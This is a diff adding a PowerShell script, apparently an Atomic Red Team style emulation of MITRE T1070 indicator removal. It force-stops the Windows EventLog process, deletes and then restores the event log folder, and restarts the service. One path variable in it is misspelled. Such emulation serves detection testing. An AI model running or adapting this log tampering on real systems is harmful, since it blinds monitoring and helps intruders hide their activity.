@@ -1,0 +1,71 @@
+#Title: invoke-clearLogs
+#Technique: T1070
+#Tactic: TA0005
+
+function invoke-clearLogs
+    {
+    <#
+    .SYNOPSIS
+    stop eventlog process
+    backup from log folder
+    remove all log from  "$env:SystemDrive\Windows\System32\winevt\Logs\"
+    restore log folder
+    remove backup
+    
+    .DESCRIPTION
+    Attack Commands: Run with command_prompt! Elevation Required (e.g. root or admin)
+
+    .LINK
+
+    https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070/T1070.md#atomic-test-6---delete-system-logs-using-powershell
+    #>
+    $good = $false
+    $results = $null
+    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+    $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+        {  
+        $eventLogId = Get-WmiObject -Class Win32_Service -Filter "Name LIKE 'EventLog'" | Select-Object -ExpandProperty ProcessId
+        Stop-Process -Id $eventLogId -Force
+        $info = "EventLog is stopped`n" 
+        New-Item -ItemType directory -Path  $env:SystemDriv\copy_logs
+        Get-ChildItem -Path $env:SystemDrive\Windows\System32\winevt\Logs\ | Copy-Item -Destination $Env:SystemDrive\copy_logs
+        $info += "copy folder logs for backup`n" 
+        Remove-Item $env:SystemDrive\Windows\System32\winevt\Logs\ -Recurse
+        $info += "Logs cleans successful`n" 
+        New-Item -ItemType directory -Path  $env:SystemDrive\Windows\System32\winevt\Logs
+        Get-ChildItem -Path $Env:SystemDrive\copy_logs\ | Copy-Item -Destination $env:SystemDrive\Windows\System32\winevt\Logs
+        $info += "backup log was restored`n" 
+        Remove-Item $env:SystemDrive\copy_logs -Recurse
+        Start-Service -Name EventLog
+        $info += "EventLog is running again`n" 
+        $results = $info
+        $good = $true
+        sleep 1
+        }
+    else
+        {
+        $results = "Administrator or System privileges necessary."
+        }
+
+    return @{results=$results;success=$good}
+    }
+
+
+#Main program
+$execute = {
+  
+}
+
+#GiveMeData if needed
+
+#get-credentials
+$execute = invoke-clearLogs
+
+#PutData if needed
+  # if($execute.success)
+  # {
+    
+  # }
+
+return @{results=$execute.results;success=$execute.success}
